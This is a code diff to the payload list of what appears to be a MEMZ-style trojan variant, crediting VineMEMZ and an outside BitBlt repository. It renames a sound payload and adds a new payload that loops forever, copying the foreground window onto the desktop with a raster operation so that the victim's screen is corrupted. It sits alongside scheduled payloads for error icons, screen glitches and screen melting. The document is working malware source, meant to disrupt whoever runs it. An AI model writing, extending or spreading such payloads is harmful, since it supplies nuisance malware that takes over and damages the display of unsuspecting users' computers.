@@ -10,11 +10,12 @@ PAYLOAD payloads[] = {
 	{ payloadMessageBox, 20000 },
 	{ payloadDrawErrors, 10000 },
 	{ payloadChangeText, 40000 },
-	{ payloadScaryBus, 28000 },
-        { payloadScreenGlitches, 15000 },
+	{ payloadVineMEMZCrazyBus, 28000 },
+    { payloadScreenGlitches, 15000 },
 	{ payloadScreenmelting, 29000 },
 	{ payloadPIP, 30000 },
 	{ payloadPuzzle, 15000 },
+	{ payloadBitBlt, 20000 },
 };
 
 const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
@@ -277,9 +278,26 @@ int payloadDrawErrors(PAYLOADFUNC) {
 
 	out: return 2;
 }
+/////Credits and thanks to Faliture 
+////https://github.com/Faliture/BitBlt/blob/main/BitBlt/BitBlt.cpp
+int payloadBitBlt(PAYLOADFUNC) {
+
+	HWND upWnd = GetForegroundWindow();
+	HDC upHdc = GetDC(upWnd);
+	HDC desktop = GetDC(NULL);
+	int xs = GetSystemMetrics(SM_CXSCREEN);
+	int ys = GetSystemMetrics(SM_CYSCREEN);
+	while (true) {
+		upWnd = GetForegroundWindow();
+		upHdc = GetDC(upWnd);
+		desktop = GetDC(NULL);
+		BitBlt(desktop, -1,1, xs, ys, upHdc, 2,2, 0x999999);
+	}
+}
+
 ////Credits and thanks to Dobby233Liu and Leurak
 ////https://github.com/Dobby233Liu/VineMEMZ/blob/master/VCProject/MEMZ/payloads.cpp
-int payloadScaryBus(PAYLOADFUNC) {
+int payloadVineMEMZCrazyBus(PAYLOADFUNC) {
 	
 		const int samples = 44100;
 
